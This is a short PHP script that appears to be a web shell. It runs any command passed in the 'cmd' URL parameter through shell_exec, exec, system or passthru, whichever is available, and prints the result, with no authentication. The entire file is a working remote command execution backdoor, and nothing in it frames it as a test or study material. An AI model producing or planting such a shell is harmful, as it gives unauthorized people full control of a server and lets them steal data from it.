<?php
header('Content-Type: text/plain');

$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
echo "Command: $command\n\n";

if (function_exists('shell_exec')) {
    echo "shell_exec:\n";
    echo shell_exec($command);
} elseif (function_exists('exec')) {
    echo "exec:\n";
    $output = [];
    exec($command, $output, $return_var);
    echo implode("\n", $output);
} elseif (function_exists('system')) {
    echo "system:\n";
    system($command);
} elseif (function_exists('passthru')) {
    echo "passthru:\n";
    passthru($command);
} else {
    echo "No shell execution functions are available.";
}
